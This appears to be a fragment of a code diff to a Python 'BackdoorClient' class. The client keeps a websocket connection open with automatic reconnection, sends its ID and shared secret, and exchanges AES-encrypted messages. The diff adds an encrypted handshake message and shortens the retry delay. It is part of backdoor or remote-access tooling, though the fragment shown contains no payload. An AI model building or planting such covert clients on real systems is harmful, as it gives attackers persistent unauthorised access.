@@ -33,6 +33,11 @@ class BackdoorClient(threading.Thread):
                 sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET)}
                 ws.send(json.dumps(sercret_msg))
 
+                time.sleep(1)
+
+                sercret_msg = {'data': self.encrypt('hello im client')}
+                ws.send(json.dumps(sercret_msg))
+
                 while True:
                     result = ws.recv()
                     print result
@@ -42,8 +47,7 @@ class BackdoorClient(threading.Thread):
             except Exception as e:
                 if ws:
                     ws.close()
-                time.sleep(5)
-
+                time.sleep(3)
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
